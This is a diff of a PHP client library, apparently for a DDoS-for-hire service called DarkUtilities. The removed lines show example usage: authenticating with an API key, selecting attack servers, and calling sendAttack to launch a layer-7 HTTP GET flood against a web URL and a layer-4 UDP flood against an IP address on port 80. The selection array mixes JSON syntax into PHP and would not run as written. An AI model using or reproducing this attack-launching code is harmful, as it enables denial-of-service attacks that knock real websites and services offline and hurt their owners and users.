@@ -66,29 +66,3 @@ class DarkUtilities {
        return json_decode(curl_exec($request));
    }
 }
-
-$session = new DarkUtilities('KEY');
-
-echo $session->getUserInfo(); # Return dict with account infos
-echo $session->getServerList(); # Return dict with servers list
-
-$selection = [
-    {"server_id": "fd06d2f5192fd94341543d15ae8158bb", server_selected: true},
-    {"server_id": "3d4154fd8158061d2f5192fd9435aebb", server_selected: true},
-    {"server_id": "4154fd06d2f5192fd9433d15ae8158bb", server_selected: true}
-];
-
-$session->sendAttack('ddos-layer7', [ # Send layer7 attacks
-    'method' => 'GET',
-    'target' => 'https://exemple.com/hit',
-    'concurrents' => 100,
-    'time' => 20
-]);
-
-$session->sendAttack('ddos-layer4', [ # Send layer4 attacks
-    'method' => 'UDP',
-    'target' => '1.1.1.1',
-    'port' => 80,
-    'concurrents' => 10,
-    'time' => 20
-]);
